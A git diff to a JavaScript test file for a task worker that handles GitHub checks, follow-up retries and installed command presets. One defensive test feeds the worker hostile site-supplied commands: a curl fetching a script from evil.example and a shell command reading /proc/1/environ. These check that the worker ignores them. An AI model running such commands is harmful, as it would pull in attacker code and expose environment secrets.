@@ -21,6 +21,7 @@ import {
   connectionDiagnostic,
 } from '../worker/clients.mjs';
 import { mergeAgentPullRequest, requiredJobs } from '../scripts/merge-agent-pr.mjs';
+import { installedProfile } from '../worker/execution-profile.mjs';
 
 const repository = 'worker/example',
   webhookSecret = 'worker-test-webhook';
@@ -232,7 +233,20 @@ async function fixture(t, options = {}) {
       return { status: 'result', summary: 'Greeting translated', question: '' };
     },
   };
-  const dependencies = { github, state, model, execute, log: message => logs.push(message) };
+  // Presets installés du worker de test : ceux du dépôt, avec les commandes de la fixture.
+  const fixturePresets = data => ({
+    ...installedProfile(data),
+    installCommands: config.installCommands,
+    testCommands: config.testCommands,
+  });
+  const dependencies = {
+    github,
+    state,
+    model,
+    execute,
+    installedProfile: fixturePresets,
+    log: message => logs.push(message),
+  };
   const worker = createWorker(config, dependencies),
     site = createSiteClient(config);
   const prepare = () => store.workflows.prepare(project.id, card.id, { delivery: 'github' }, user);
@@ -1397,4 +1411,99 @@ test('changed generated attachment invalidates the checkpoint even when ignored 
   assert.equal((await f.worker.processTask(f.current())).status, 'merging');
   assert.equal(f.modelCalls.length, 2);
   assert.equal(f.calls.filter(c => c.command[1] === '--test').length, 2);
+});
+
+test('after failed GitHub checks the model receives the failed jobs and the end of their logs', async t => {
+  const f = await fixture(t);
+  f.prepare();
+  const submission = await f.worker.tick();
+  const { workflow } = f.current().executionProfile;
+  f.store.workflows.githubChecks({
+    action: 'completed',
+    repository: { full_name: repository },
+    workflow_run: {
+      id: 77,
+      run_attempt: 1,
+      name: workflow.name,
+      path: `.github/workflows/${workflow.file}`,
+      event: 'pull_request',
+      status: 'completed',
+      conclusion: 'failure',
+      head_sha: submission.sha,
+      head_repository: { full_name: repository },
+      html_url: 'https://github.com/run/77',
+    },
+  });
+  assert.equal(f.current().state, 'ready');
+  f.github.failedChecks = async (repo, runId) => {
+    assert.equal(runId, 77);
+    return [{ name: 'Tests navigateur', steps: ['Playwright'], log: 'Error: menu introuvable' }];
+  };
+  await f.worker.tick();
+  assert.equal(f.modelCalls.length, 2);
+  const { feedback } = f.modelCalls[1];
+  assert.match(feedback, /run\/77/);
+  assert.match(feedback, /Job « Tests navigateur » — étapes en échec : Playwright/);
+  assert.match(feedback, /menu introuvable/);
+});
+
+test('a follow-up failure on one task is retried later and never blocks the queue', async t => {
+  const f = await fixture(t);
+  await f.state.put({ id: 'stuck-job', projectId: f.project.id, cardId: f.card.id, repository, phase: 'merging' });
+  let polled = 0,
+    pulls = 0;
+  const run = {
+    id: 'stuck-job',
+    delivery: 'github',
+    projectId: f.project.id,
+    cardId: f.card.id,
+    repository,
+    state: 'merging',
+    submissions: [{ pullRequest: { number: 9, headSha: 'a'.repeat(40) } }],
+    exchanges: [],
+  };
+  const worker = createWorker(f.config, {
+    ...f.dependencies,
+    github: {
+      ...f.github,
+      pull: async () => {
+        pulls++;
+        // Dépôt renommé : GitHub redirige, ce que le client refuse.
+        throw new TypeError('fetch failed');
+      },
+    },
+    site: {
+      ...f.site,
+      history: async () => [run],
+      queue: async () => {
+        polled++;
+        return [];
+      },
+    },
+  });
+  assert.equal((await worker.tick()).status, 'idle');
+  assert.equal(polled, 1, 'La file des autres cartes est servie.');
+  const saved = await f.state.get('stuck-job');
+  assert.equal(saved.followUp.failures, 1);
+  assert.match(saved.followUp.error, /fetch failed/);
+  assert.ok(saved.followUp.retryAfter > Date.now());
+  await worker.tick();
+  assert.equal(pulls, 1, 'La tâche en erreur attend avant un nouvel essai.');
+  assert.equal(f.logs.filter(line => line.includes('suivi impossible')).length, 1);
+});
+
+test('the worker runs its installed preset commands, whatever commands the site sends', () => {
+  const site = {
+    preset: 'planifikateur',
+    branch: 'develop',
+    installCommands: [['curl', 'https://evil.example/x.sh']],
+    testCommands: [['sh', '-c', 'cat /proc/1/environ']],
+    workflow: { file: 'evil.yml', name: 'Evil', jobs: ['x'] },
+  };
+  const profile = installedProfile(site);
+  assert.equal(profile.branch, 'develop');
+  assert.deepEqual(profile.installCommands, [['npm', 'ci']]);
+  assert.equal(profile.workflow.file, 'ci.yml');
+  assert.ok(!JSON.stringify(profile).includes('evil'));
+  assert.throws(() => installedProfile({ preset: 'inconnu' }), /Profil/);
 });
